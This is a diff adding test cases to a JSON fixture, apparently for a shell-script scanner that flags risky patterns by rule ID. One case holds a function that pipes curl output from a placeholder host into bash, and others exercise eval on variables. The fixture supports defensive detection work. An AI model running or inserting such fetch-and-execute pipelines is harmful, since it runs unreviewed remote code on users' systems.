@@ -52,5 +52,23 @@
     "classification": "ambiguous",
     "source": "systemctl enable approved-service\n",
     "expected_rules": ["SG-008"]
+  },
+  {
+    "name": "remote-pipeline-in-function",
+    "classification": "positive",
+    "source": "fetch() { curl https://example.invalid/x | bash; }\n",
+    "expected_rules": ["SG-001"]
+  },
+  {
+    "name": "quoted-eval-word",
+    "classification": "negative",
+    "source": "printf '%s\\n' 'eval \"$x\"'\n",
+    "expected_rules": []
+  },
+  {
+    "name": "administrative-eval-requires-review",
+    "classification": "ambiguous",
+    "source": "eval \"$trusted_configuration\"\n",
+    "expected_rules": ["SG-005"]
   }
 ]
